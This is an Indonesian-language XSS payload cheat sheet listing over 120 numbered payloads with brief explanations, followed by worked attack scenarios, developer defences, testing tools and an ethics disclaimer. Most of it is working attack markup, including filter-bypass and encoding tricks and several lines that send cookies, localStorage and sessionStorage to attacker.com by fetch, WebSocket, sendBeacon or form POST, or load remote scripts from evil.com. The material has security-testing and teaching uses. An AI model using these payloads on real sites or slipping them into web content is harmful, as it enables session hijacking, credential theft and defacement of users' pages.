# Payload-XSS

## Daftar Isi
1. [Payload Dasar (1-20)](#payload-dasar-1-20)
2. [Event Handlers (21-40)](#event-handlers-21-40)
3. [JavaScript Payload (41-60)](#javascript-payload-41-60)
4. [Bypass Filter (61-80)](#bypass-filter-61-80)
5. [Payload Kontekstual (81-100)](#payload-kontekstual-81-100)
6. [Advanced Techniques (101-120)](#advanced-techniques-101-120)

## Payload Dasar (1-20)

### 1. Basic Script Tag
```html
<script>alert('XSS')</script>
```
**Penjelasan**: Payload XSS paling dasar menggunakan tag `<script>`.  
**Value**: `alert('XSS')` menampilkan popup dengan teks 'XSS'.  
**Implementasi**: Bekerja ketika input user langsung dirender tanpa sanitasi.

### 2. Image dengan onerror
```html
<img src="x" onerror="alert('XSS')">
```
**Penjelasan**: Menggunakan event handler `onerror` yang terpicu ketika gambar gagal dimuat.  
**Value "x"**: URL invalid yang memicu error.  
**Implementasi**: Berguna jika tag `<script>` difilter.

### 3. SVG dengan onload
```html
<svg onload="alert('XSS')">
```
**Penjelasan**: SVG tag dengan event `onload`.  
**Implementasi**: Sering diizinkan di aplikasi yang menerima upload gambar.

### 4. Body onload
```html
<body onload="alert(document.cookie)">
```
**Penjelasan**: Event handler di tag `<body>`.  
**Value**: `document.cookie` mengakses cookies user.  
**Implementasi**: Jika bisa inject ke awal body HTML.

### 5. Input autofocus
```html
<input type="text" onfocus="alert('XSS')" autofocus>
```
**Penjelasan**: Autofocus membuat element langsung fokus, memicu `onfocus`.  
**Implementasi**: Trigger otomatis tanpa interaksi user.

### 6. Details tag HTML5
```html
<details open ontoggle="alert('XSS')">
  <summary>Click me</summary>
</details>
```
**Penjelasan**: Tag HTML5 details dengan event `ontoggle`.  
**Implementasi**: `open` attribute membuat event langsung terpicu.

### 7. Iframe javascript URI
```html
<iframe src="javascript:alert('XSS')">
```
**Penjelasan**: Menggunakan protocol `javascript:` dalam src attribute.  
**Implementasi**: Mengeksekusi JS dalam konteks iframe.

### 8. Anchor tag dengan javascript
```html
<a href="javascript:alert('XSS')">Click me</a>
```
**Penjelasan**: `javascript:` protocol dalam href attribute.  
**Implementasi**: Saat user mengklik link.

### 9. Form dengan formaction
```html
<form><button formaction="javascript:alert('XSS')">Submit</button></form>
```
**Penjelasan**: `formaction` attribute override action form.  
**Implementasi**: Bypass filter yang hanya cek tag `<script>`.

### 10. Video source onerror
```html
<video><source onerror="alert('XSS')"></video>
```
**Penjelasan**: Sama seperti img onerror, tapi untuk video.  
**Implementasi**: Media tag sering memiliki filter berbeda.

### 11. Audio tag
```html
<audio src=x onerror="alert('XSS')">
```
**Penjelasan**: Audio tag dengan event onerror.  
**Implementasi**: Alternatif untuk multimedia context.

### 12. Marquee tag
```html
<marquee onstart="alert('XSS')">test</marquee>
```
**Penjelasan**: Tag marquee (deprecated) dengan event `onstart`.  
**Implementasi**: Bypass filter modern yang fokus pada tag baru.

### 13. Object tag
```html
<object data="x" onerror="alert('XSS')">
```
**Penjelasan**: Object tag untuk embed konten.  
**Implementasi**: `data` attribute dengan value invalid memicu onerror.

### 14. Embed tag
```html
<embed src="javascript:alert('XSS')">
```
**Penjelasan**: Embed tag mirip dengan object.  
**Implementasi**: Support `javascript:` protocol di beberapa browser.

### 15. Base tag manipulation
```html
<base href="javascript:alert('XSS')//">
```
**Penjelasan**: Base tag menentukan base URL untuk relative URLs.  
**Implementasi**: Bisa mempengaruhi semua relative links di page.

### 16. Meta refresh
```html
<meta http-equiv="refresh" content="0;url=javascript:alert('XSS')">
```
**Penjelasan**: Meta tag untuk redirect.  
**Implementasi**: Redirect ke javascript URL.

### 17. Link tag
```html
<link rel="import" href="javascript:alert('XSS')">
```
**Penjelasan**: HTML imports (deprecated).  
**Implementasi**: Mengeksekusi JS saat resource di-load.

### 18. Applet tag (Java)
```html
<applet code="Malicious.class"></applet>
```
**Penjelasan**: Untuk Java applets (sangat tua).  
**Implementasi**: Butuh compiled Java class.

### 19. Keygen tag
```html
<keygen onfocus="alert('XSS')" autofocus>
```
**Penjelasan**: Keygen tag untuk generate key pairs (deprecated).  
**Implementasi**: Support event handlers seperti input.

### 20. Isindex tag
```html
<isindex onfocus="alert('XSS')" autofocus>
```
**Penjelasan**: Tag tua untuk single-line input.  
**Implementasi**: Di-support di browser lama.

## Event Handlers (21-40)

### 21. onmouseover
```html
<img src="x" onmouseover="alert('XSS')">
```
**Penjelasan**: Trigger saat mouse hover di atas element.  
**Value**: Bisa diganti dengan fungsi pencurian data.

### 22. onmouseenter
```html
<div onmouseenter="alert('XSS')">Hover me</div>
```
**Penjelasan**: Similar to onmouseover.  
**Implementasi**: Untuk div dan element block lainnya.

### 23. onblur dengan autofocus
```html
<input onblur="alert('XSS')" autofocus><input autofocus>
```
**Penjelasan**: `onblur` terpicu saat element kehilangan focus.  
**Implementasi**: Input kedua mengambil focus dari pertama.

### 24. onchange
```html
<select onchange="alert('XSS')"><option>1<option>2</select>
```
**Penjelasan**: Event saat pilihan berubah.  
**Implementasi**: Berguna untuk dropdowns.

### 25. onkeypress
```html
<input onkeypress="alert('XSS')">
```
**Penjelasan**: Trigger saat tombol ditekan.  
**Implementasi**: Bisa untuk keylogger sederhana.

### 26. onselect
```html
<textarea onselect="alert('XSS')">Select this text</textarea>
```
**Penjelasan**: Event saat teks diseleksi.  
**Implementasi**: User harus select teks manual.

### 27. onloadstart
```html
<img src="x" onloadstart="alert('XSS')">
```
**Penjelasan**: Event saat loading dimulai.  
**Implementasi**: Terpicu sebelum onerror.

### 28. onanimationstart
```html
<div style="animation:x;" onanimationstart="alert('XSS')"></div>
<style>@keyframes x{}</style>
```
**Penjelasan**: CSS animation events.  
**Implementasi**: Butuh CSS animation yang didefinisikan.

### 29. ontransitionend
```html
<div style="transition:all 1s;" ontransitionend="alert('XSS')"></div>
```
**Penjelasan**: CSS transition events.  
**Implementasi**: Butuh perubahan style untuk trigger.

### 30. onscroll
```html
<div onscroll="alert('XSS')" style="height:100px;overflow:scroll">
  <div style="height:200px">Scroll me</div>
</div>
```
**Penjelasan**: Event saat element di-scroll.  
**Implementasi**: Butuh scrollable content.

### 31. onresize
```html
<iframe onresize="alert('XSS')" style="width:100px;height:100px"></iframe>
```
**Penjelasan**: Event saat element di-resize.  
**Implementasi**: Di-trigger oleh window resize atau script.

### 32. ontoggle
```html
<details ontoggle="alert('XSS')"><summary>Toggle</summary></details>
```
**Penjelasan**: Event untuk details tag.  
**Implementasi**: Saat details dibuka/ditutup.

### 33. oncontextmenu
```html
<div oncontextmenu="alert('XSS')">Right click here</div>
```
**Penjelasan**: Event saat right-click.  
**Implementasi**: Saat user klik kanan.

### 34. onauxclick
```html
<div onauxclick="alert('XSS')">Middle click here</div>
```
**Penjelasan**: Event untuk middle mouse button.  
**Implementasi**: Non-primary mouse clicks.

### 35. onwheel
```html
<div onwheel="alert('XSS')" style="height:100px">Scroll wheel here</div>
```
**Penjelasan**: Mouse wheel events.  
**Implementasi**: Saat user menggunakan scroll wheel.

### 36. ondrag
```html
<div draggable="true" ondrag="alert('XSS')">Drag me</div>
```
**Penjelasan**: Drag and drop events.  
**Implementasi**: Saat element di-drag.

### 37. ondrop
```html
<div ondrop="alert('XSS')" style="height:100px;border:1px solid">Drop here</div>
```
**Penjelasan**: Drop event untuk drag and drop.  
**Implementasi**: Butuh proper draggable element.

### 38. onfocusin
```html
<input onfocusin="alert('XSS')" autofocus>
```
**Penjelasan**: Similar to onfocus.  
**Implementasi**: Support di beberapa browser.

### 39. onfocusout
```html
<input onfocusout="alert('XSS')" autofocus><input autofocus>
```
**Penjelasan**: Similar to onblur.  
**Implementasi**: Saat element kehilangan focus.

### 40. oninput
```html
<input oninput="alert('XSS')">
```
**Penjelasan**: Event saat value berubah.  
**Implementasi**: Setiap karakter yang diketik.

## JavaScript Payload (41-60)

### 41. Cookie Theft dengan Fetch
```html
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```
**Penjelasan**: Mengirim cookie ke server attacker.  
**Value**: `document.cookie` berisi semua cookies.  
**Implementasi**: Modern API untuk HTTP requests.

### 42. Location Redirect
```html
<script>window.location = 'https://phishing.com';</script>
```
**Penjelasan**: Redirect user ke site lain.  
**Implementasi**: Bisa untuk phishing attacks.

### 43. Document Write
```html
<script>document.write('<img src=x onerror=alert(1)>');</script>
```
**Penjelasan**: Menulis HTML langsung ke document.  
**Implementasi**: Bypass beberapa filter.

### 44. InnerHTML Manipulation
```html
<script>document.body.innerHTML = 'HACKED';</script>
```
**Penjelasan**: Mengganti seluruh konten page.  
**Implementasi**: Defacement website.

### 45. Creating Elements
```html
<script>
var s = document.createElement('script');
s.src = 'https://attacker.com/malicious.js';
document.body.appendChild(s);
</script>
```
**Penjelasan**: Membuat element script secara dinamis.  
**Implementasi**: Load external malicious script.

### 46. Using eval
```html
<script>eval('alert("XSS")');</script>
```
**Penjelasan**: Mengevaluasi string sebagai JavaScript.  
**Implementasi**: Bypass filter dengan string splitting.

### 47. Function Constructor
```html
<script>new Function('alert("XSS")')();</script>
```
**Penjelasan**: Membuat fungsi baru dari string.  
**Implementasi**: Alternatif untuk eval.

### 48. setTimeout
```html
<script>setTimeout("alert('XSS')", 1000);</script>
```
**Penjelasan**: Delayed execution.  
**Implementasi**: Mengeksekusi setelah delay.

### 49. setInterval
```html
<script>setInterval("alert('XSS')", 1000);</script>
```
**Penjelasan**: Repeated execution.  
**Implementasi**: Mengeksekusi berulang setiap interval.

### 50. Using import()
```html
<script>import('data:text/javascript,alert("XSS")');</script>
```
**Penjelasan**: Dynamic import dengan data URI.  
**Implementasi**: ES6 module import.

### 51. WebSocket Connection
```html
<script>
var ws = new WebSocket('ws://attacker.com');
ws.onopen = function() { ws.send(document.cookie); };
</script>
```
**Penjelasan**: Membuka WebSocket connection.  
**Implementasi**: Untuk real-time data exfiltration.

### 52. Beacon API
```html
<script>
navigator.sendBeacon('https://attacker.com/log', document.cookie);
</script>
```
**Penjelasan**: Mengirim data tanpa menunggu response.  
**Implementasi**: Efisien untuk logging.

### 53. Console Log
```html
<script>console.log('XSS executed');</script>
```
**Penjelasan**: Output ke browser console.  
**Implementasi**: Untuk debugging payload.

### 54. Alert dengan document.domain
```html
<script>alert(document.domain);</script>
```
**Penjelasan**: Menampilkan domain saat ini.  
**Implementasi**: Untuk reconaissance.

### 55. Prompt Box
```html
<script>prompt('Enter password:', '');</script>
```
**Penjelasan**: Meminta input dari user.  
**Implementasi**: Bisa untuk phishing credentials.

### 56. Confirm Box
```html
<script>if(confirm('Continue?')){ alert('Proceeding'); }</script>
```
**Penjelasan**: Confirmation dialog.  
**Implementasi**: Untuk social engineering.

### 57. Using with statement
```html
<script>with(document)alert('XSS');</script>
```
**Penjelasan**: `with` statement untuk scope.  
**Implementasi**: Bypass beberapa filter.

### 58. Using instanceof
```html
<script>alert instanceof Function && alert('XSS');</script>
```
**Penjelasan**: Type checking sebelum eksekusi.  
**Implementasi**: Menghindari errors.

### 59. Using void operator
```html
<script>void alert('XSS');</script>
```
**Penjelasan**: `void` operator mengevaluasi expression.  
**Implementasi**: Sintaks alternatif.

### 60. Template literals
```html
<script>alert`XSS`;</script>
```
**Penjelasan**: Template literals tanpa parentheses.  
**Implementasi**: Bypass filter yang cari parentheses.

## Bypass Filter (61-80)

### 61. Case Manipulation
```html
<ScRiPt>alert('XSS')</ScRiPt>
```
**Penjelasan**: Mixed case untuk bypass case-sensitive filters.  
**Implementasi**: Bekerja karena HTML case-insensitive.

### 62. Null Byte Injection
```html
<script%00>alert('XSS')</script>
```
**Penjelasan**: Null byte (`%00`) menghentikan string parsing.  
**Implementasi**: Bypass beberapa string-based filters.

### 63. Without Closing Tag
```html
<script>alert('XSS')
```
**Penjelasan**: Tanpa closing tag.  
**Implementasi**: Browser akan auto-close dalam beberapa konteks.

### 64. Extra Spaces
```html
<script     >alert('XSS')</script>
```
**Penjelasan**: Extra spaces dalam tag.  
**Implementasi**: Bypass filter yang cari pola exact.

### 65. Tab Characters
```html
<script	>alert('XSS')</script>
```
**Penjelasan**: Menggunakan tab bukan spasi.  
**Implementasi**: Bypass whitespace filters.

### 66. Newline in Attribute
```html
<img src="x"
onerror="alert('XSS')">
```
**Penjelasan**: Newline memisahkan attribute.  
**Implementasi**: Bypass pattern matching single-line.

### 67. Double Quotes Escape
```html
<img src="x"onerror="alert('XSS')">
```
**Penjelasan**: Tidak ada spasi setelah quotes.  
**Implementasi**: Bypass filters yang cari spasi.

### 68. No Quotes
```html
<img src=x onerror=alert('XSS')>
```
**Penjelasan**: Attributes tanpa quotes.  
**Implementasi**: Valid HTML, bypass quote filters.

### 69. Backticks
```html
<img src=`x` onerror=`alert('XSS')`>
```
**Penjelasan**: Menggunakan backticks sebagai quotes.  
**Implementasi**: Bypass quote character filters.

### 70. Hex Encoding
```html
<script>alert('\x58\x53\x53')</script>
```
**Penjelasan**: Hex encoding untuk karakter.  
**Implementasi**: Bypass keyword detection.

### 71. Unicode Escape
```html
<script>alert('\u0058\u0053\u0053')</script>
```
**Penjelasan**: Unicode escape sequences.  
**Implementasi**: Bypass filters yang decode hanya sekali.

### 72. HTML Entities
```html
<script>alert(&#39;XSS&#39;)</script>
```
**Penjelasan**: HTML entities dalam JavaScript.  
**Implementasi**: Browser decode entities sebelum eksekusi.

### 73. URL Encoding
```html
%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E
```
**Penjelasan**: Full URL encoding.  
**Implementasi**: Bypass jika aplikasi decode URL.

### 74. Double URL Encoding
```html
%253Cscript%253Ealert%2528%2527XSS%2527%2529%253C%252Fscript%253E
```
**Penjelasan**: Encode dua kali.  
**Implementasi**: Bypass jika aplikasi decode multiple times.

### 75. Base64 Encoding
```html
<script>eval(atob('YWxlcnQoJ1hTUycp'))</script>
```
**Penjelasan**: Base64 decode lalu eval.  
**Implementasi**: `atob()` decodes base64 string.

### 76. Comment Injection
```html
<script>alert('XSS')//</script>
```
**Penjelasan**: Comment di akhir.  
**Implementasi**: Bypass filters yang cari closing tag tertentu.

### 77. Multi-line Comments
```html
<script>/*\*/alert('XSS')//</script>
```
**Penjelasan**: Complex comment patterns.  
**Implementasi**: Bypass filters yang remove comments.

### 78. Breaking JavaScript Strings
```html
<script>alert('XSS\'');</script>
```
**Penjelasan**: Escape quotes dalam string.  
**Implementasi**: Bypass quote matching.

### 79. Using // for Division
```html
<script>1/alert('XSS')</script>
```
**Penjelasan**: Division operator memulai expression.  
**Implementasi**: Sintaks tidak biasa.

### 80. Using && Operator
```html
<script>1&&alert('XSS')</script>
```
**Penjelasan**: Logical AND operator.  
**Implementasi**: Mengevaluasi kedua sisi.

## Payload Kontekstual (81-100)

### 81. Dalam Attribute Value
```html
" onmouseover="alert('XSS')
```
**Penjelasan**: Menutup attribute dan menambah baru.  
**Implementasi**: Untuk `<input value="USER_INPUT">`.

### 82. Dalam Single Quotes
```html
' onmouseover='alert("XSS")
```
**Penjelasan**: Untuk attributes dengan single quotes.  
**Implementasi**: Untuk `<input value='USER_INPUT'>`.

### 83. Breakout dari JavaScript String
```html
"; alert('XSS'); //
```
**Penjelasan**: Menutup string dan menambah statement baru.  
**Implementasi**: Untuk `<script>var x = "USER_INPUT";</script>`.

### 84. Breakout dari Single Quote JS
```html
'; alert('XSS'); //
```
**Penjelasan**: Sama seperti 83 tapi untuk single quotes.  
**Implementasi**: Untuk `<script>var x = 'USER_INPUT';</script>`.

### 85. Dalam Event Handler
```html
x" onerror="alert('XSS')
```
**Penjelasan**: Untuk attribute yang sudah ada.  
**Implementasi**: Untuk `<img src="USER_INPUT">`.

### 86. Dalam Style Attribute
```html
x; background: url('javascript:alert("XSS")')
```
**Penjelasan**: CSS injection dalam style attribute.  
**Implementasi**: Untuk `<div style="USER_INPUT">`.

### 87. Dalam HTML Comment
```html
--><script>alert('XSS')</script>
```
**Penjelasan**: Breakout dari HTML comment.  
**Implementasi**: Untuk `<!-- USER_INPUT -->`.

### 88. Breakout dari Textarea
```html
</textarea><script>alert('XSS')</script>
```
**Penjelasan**: Menutup textarea tag.  
**Implementasi**: Untuk `<textarea>USER_INPUT</textarea>`.

### 89. Breakout dari Title
```html
</title><script>alert('XSS')</script>
```
**Penjelasan**: Menutup title tag.  
**Implementasi**: Untuk `<title>USER_INPUT</title>`.

### 90. Breakout dari Style
```html
</style><script>alert('XSS')</script>
```
**Penjelasan**: Menutup style tag.  
**Implementasi**: Untuk `<style>USER_INPUT</style>`.

### 91. Dalam Script Tag (tricky)
```html
</script><script>alert('XSS')</script>
```
**Penjelasan**: Menutup script tag yang ada.  
**Implementasi**: Untuk konteks dalam `<script>` block.

### 92. Dalam Onload Event
```html
'); alert('XSS'); //
```
**Penjelasan**: Untuk event handler yang ada.  
**Implementasi**: Untuk `onload="function('USER_INPUT')"`.

### 93. Dalam JSON Response
```html
"</script><script>alert('XSS')</script>
```
**Penjelasan**: Ketika JSON dirender sebagai HTML.  
**Implementasi**: Untuk AJAX responses.

### 94. Dalam CSS URL
```html
url('javascript:alert("XSS")')
```
**Penjelasan**: JavaScript dalam CSS url().  
**Implementasi**: Untuk background-image properties.

### 95. Dalam CSS Import
```html
@import 'javascript:alert("XSS")';
```
**Penjelasan**: @import dengan javascript URL.  
**Implementasi**: Dalam style tags atau attributes.

### 96. Dalam MathML
```html
<math><mi//onclick="alert('XSS')">click
```
**Penjelasan**: MathML dengan comment injection.  
**Implementasi**: Bypass HTML parsers.

### 97. Dalam SVG Script
```html
<svg><script>alert('XSS')</script></svg>
```
**Penjelasan**: Script dalam SVG namespace.  
**Implementasi**: Bypass filters yang hanya cek HTML.

### 98. Dalam XML Namespace
```html
<xml:namespace prefix="t"/><t:xss xmlns:t="javascript:alert('XSS')">
```
**Penjelasan**: Custom XML namespaces.  
**Implementasi**: Advanced XML injection.

### 99. Dalam Data Attribute
```html
" data-xss="alert('XSS')" onmouseover="eval(this.getAttribute('data-xss'))
```
**Penjelasan**: Menyimpan payload di data attribute.  
**Implementasi**: Bypass filters yang scan on* attributes.

### 100. Dalam Template Literal
```html
${alert('XSS')}
```
**Penjelasan**: Template literal dalam JavaScript.  
**Implementasi**: Untuk template engines atau eval contexts.

## Advanced Techniques (101-120+)

### 101. Mutation XSS (mXSS)
```html
<noscript><p title="</noscript><img src=x onerror=alert('XSS')>">
```
**Penjelasan**: Memanfaatkan perbedaan parsing dan serialization.

### 102. DOM Clobbering
```html
<form id="xss"><input name="innerHTML" value="<img src=x onerror=alert('XSS')>"></form>
<script>alert(xss.innerHTML);</script>
```
**Penjelasan**: Form elements menjadi properties di window object.

### 103. Prototype Pollution
```html
<script>
Object.prototype.hasOwnProperty = function() {
  alert('XSS');
  return true;
};
</script>
```
**Penjelasan**: Memodifikasi built-in prototypes.

### 104. Using document.domain
```html
<script>document.domain = document.domain; alert('XSS');</script>
```
**Penjelasan**: Mengatur document.domain bisa trigger beberapa behaviors.

### 105. CSS Expression (IE)
```html
<div style="color:expression(alert('XSS'))">
```
**Penjelasan**: CSS expressions (IE only).

### 106. Behavior (IE)
```html
<div style="behavior:url(#default#time2)" onbegin="alert('XSS')"></div>
```
**Penjelasan**: IE behaviors.

### 107. VML (Vector Markup Language)
```html
<v:rect style="width:100px;height:100px" onmouseover="alert('XSS')"></v:rect>
```
**Penjelasan**: VML untuk IE.

### 108. Using namespace
```html
<HTML:SCRIPT>alert('XSS')</HTML:SCRIPT>
```
**Penjelasan**: Namespace dalam tag.

### 109. PHP Style
```html
<? echo 'alert("XSS")'; ?>
```
**Penjelasan**: Jika server menginterpretasikan sebagai PHP.

### 110. ASP Style
```html
<% Response.Write("alert('XSS')") %>
```
**Penjelasan**: Untuk ASP pages.

### 111. CDATA Breakout
```html
<![CDATA[<]]>script>alert('XSS')</script>
```
**Penjelasan**: Breakout dari CDATA section.

### 112. UTF-7 Bypass
```html
+ADw-script+AD4-alert('XSS')+ADw-/script+AD4-
```
**Penjelasan**: UTF-7 encoding bypass.

### 113. UTF-16 Bypass
```html
<script>\u0061\u006C\u0065\u0072\u0074('XSS')</script>
```
**Penjelasan**: UTF-16 encoding.

### 114. Using // for Protocol Relative
```html
<script src=//evil.com/xss.js></script>
```
**Penjelasan**: Protocol-relative URL.

### 115. Using @import in CSS
```html
<style>@import 'http://evil.com/xss.css';</style>
```
**Penjelasan**: CSS @import untuk external resources.

### 116. Using namespace in XHTML
```html
<html:script xmlns:html="http://www.w3.org/1999/xhtml">alert('XSS')</html:script>
```
**Penjelasan**: XHTML namespace declaration.

### 117. Using SVG foreignObject
```html
<svg><foreignObject><iframe onload="alert('XSS')"></iframe></foreignObject></svg>
```
**Penjelasan**: SVG foreignObject mengandung HTML.

### 118. Using MathML annotation
```html
<math><annotation encoding="text/html"><script>alert('XSS')</script></annotation></math>
```
**Penjelasan**: MathML annotation element.

### 119. Using data attribute with CSS
```html
<div data-xss="alert('XSS')" style="content:attr(data-xss);"></div>
```
**Penjelasan**: CSS attr() function.

### 120. Polyglot Payload Ultimate
```html
javascript:/*--></title></style></textarea></script></xmp></svg></noscript></iframe></noembed></noframes></template></select></math></form></body></html>--><img src=x onerror=alert('XSS')>
```
**Penjelasan**: Payload yang bekerja di banyak konteks.

### Bonus: Using document.currentScript
```html
<script>alert(document.currentScript.parentNode.innerHTML);</script>
```
**Penjelasan**: Mengakses parent element dari script.

### Bonus: Using importScripts (Web Workers)
```html
<script>importScripts('data:text/javascript,alert("XSS")');</script>
```
**Penjelasan**: Dalam Web Worker context.

## Penjelasan Value "x" dalam Payload

**Dalam payload seperti `<img src="x" onerror="alert('XSS')">`:**

1. **Apa itu "x"?**
   - String sederhana yang bukan URL gambar valid
   - Bisa berupa karakter apapun: `x`, `1`, `#`, `invalid`
   - Tujuannya: Memicu error loading, yang kemudian memicu `onerror`

2. **Kenapa tidak kosong?**
   ```html
   <img src="" onerror="alert('XSS')">
   ```
   - `src=""` akan mencoba load dari current page
   - Mungkin tidak error (jika URL current page valid)
   - Jadi "x" memastikan error

3. **Variasi lain:**
   ```html
   <img src="http://invalid" onerror="alert('XSS')">
   <img src="data:image/png;base64,invalid" onerror="alert('XSS')">
   <img src onerror="alert('XSS')">  <!-- No value at all -->
   ```

4. **Untuk testing yang lebih stealth:**
   ```html
   <img src="https://example.com/nonexistent.jpg" onerror="stealCookies()">
   ```
   - Terlihat seperti URL legit
   - Masih error karena file tidak ada

## Implementasi Nyata & Contoh

### Contoh 1: Search Box XSS
```html
<!-- Vulnerable code -->
<p>Results for: <?php echo $_GET['q']; ?></p>

<!-- Attack -->
http://target.com/search?q=<script>alert(document.cookie)</script>
```

### Contoh 2: Comment Section Stored XSS
```html
<!-- User posts comment: -->
<img src="x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">

<!-- Setiap visitor melihat komentar, cookie mereka dikirim ke attacker -->
```

### Contoh 3: Profile Page XSS
```html
<!-- User update profile bio dengan: -->
<script>
setTimeout(function() {
  var form = document.createElement('form');
  form.method = 'POST';
  form.action = 'https://attacker.com/steal';
  var input = document.createElement('input');
  input.name = 'data';
  input.value = JSON.stringify({
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage)
  });
  form.appendChild(input);
  document.body.appendChild(form);
  form.submit();
}, 3000);
</script>
```

### Contoh 4: DOM XSS dari URL Fragment
```html
<!-- Vulnerable JavaScript: -->
<script>
var page = location.hash.substring(1);
document.getElementById('content').innerHTML = page;
</script>

<!-- Attack URL: -->
http://target.com/page#<img src=x onerror=alert('XSS')>
```

### Contoh 5: XSS via File Upload (SVG)
```xml
<!-- File malicious.svg: -->
<svg xmlns="http://www.w3.org/2000/svg" onload="alert('XSS')">
  <rect width="100" height="100"/>
</svg>
```

## Security Best Practices

### Untuk Developers:
1. **Input Validation**:
   ```php
   // PHP example
   $input = htmlspecialchars($_GET['input'], ENT_QUOTES, 'UTF-8');
   ```

2. **Content Security Policy (CSP)**:
   ```http
   Content-Security-Policy: script-src 'self';
   ```

3. **Output Encoding**:
   - HTML: `htmlspecialchars()`, `htmlentities()`
   - JavaScript: `JSON.stringify()`
   - URL: `urlencode()`

4. **Use Safe APIs**:
   ```javascript
   // UNSAFE
   element.innerHTML = userInput;
   
   // SAFE
   element.textContent = userInput;
   ```

### Untuk Security Testers:
1. **Test semua input vectors**:
   - URL parameters
   - Form fields
   - Headers
   - Cookies
   - File uploads

2. **Test berbagai contexts**:
   - HTML body
   - Attributes
   - JavaScript strings
   - CSS contexts
   - URL contexts

3. **Use automated tools**:
   - Burp Suite
   - OWASP ZAP
   - XSStrike
   - XSS Hunter

## Tools untuk Testing

1. **Browser Extensions**:
   - XSS Helper
   - Maxel (Firefox)
   - XSS Tools

2. **Online Scanners**:
   - https://xsshunter.com
   - https://alf.nu/alert1
   - http://prompt.ml

3. **Local Testing Environment**:
   - OWASP WebGoat
   - DVWA (Damn Vulnerable Web App)
   - bWAPP
   - XSS Game by Google

## Catatan Penting

**Disclaimer**: 
- Payload ini untuk tujuan edukasi dan security testing
- **Selalu dapatkan izin sebelum testing**
- Gunakan hanya di lingkungan yang Anda miliki/kontrol
- Patuhi hukum setempat (UU ITE, KUHP di Indonesia)

**Etika Security Testing**:
1. **Authorization**: Selalu dapatkan izin tertulis
2. **Scope**: Jangan test di luar scope yang disetujui
3. **Responsible Disclosure**: Laporkan vulnerability dengan bertanggung jawab
4. **No Damage**: Jangan cause damage atau disruption
5. **Confidentiality**: Jangan expose data sensitif

**Untuk Pembelajaran**:
- Setup lab lokal dengan DVWA atau WebGoat
- Gunakan browser's developer tools untuk debugging
- Pelajari bagaimana browser parsing HTML/JavaScript
- Pahami Same-Origin Policy dan cara bypass-nya

Dengan memahami 100+ payload ini, Anda akan memiliki pemahaman komprehensif tentang berbagai teknik XSS yang digunakan dalam real-world scenarios. Ingat: pengetahuan ini harus digunakan secara bertanggung jawab untuk meningkatkan keamanan web, bukan untuk mengeksploitasi.
